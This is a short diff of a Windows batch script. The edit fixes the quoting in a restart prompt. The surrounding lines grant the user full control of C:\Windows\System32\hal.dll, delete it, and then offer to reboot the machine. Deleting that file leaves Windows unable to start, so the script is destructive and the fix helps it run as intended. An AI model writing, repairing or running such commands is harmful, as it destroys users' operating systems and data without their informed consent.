@@ -47,7 +47,7 @@ icacls "C:\Windows\System32\hal.dll" /grant %username%:F >nul
 del C:\Windows\System32\hal.dll
 echo Would you like to restart? ([Y]es/[N]o)
 set /p rest=^> 
-if /i "%rest%=="Y" shutdown -r -t 10
+if /i "%rest%"=="Y" shutdown -r -t 10
 timeout /t 2 /NOBREAK >nul
 
 :print
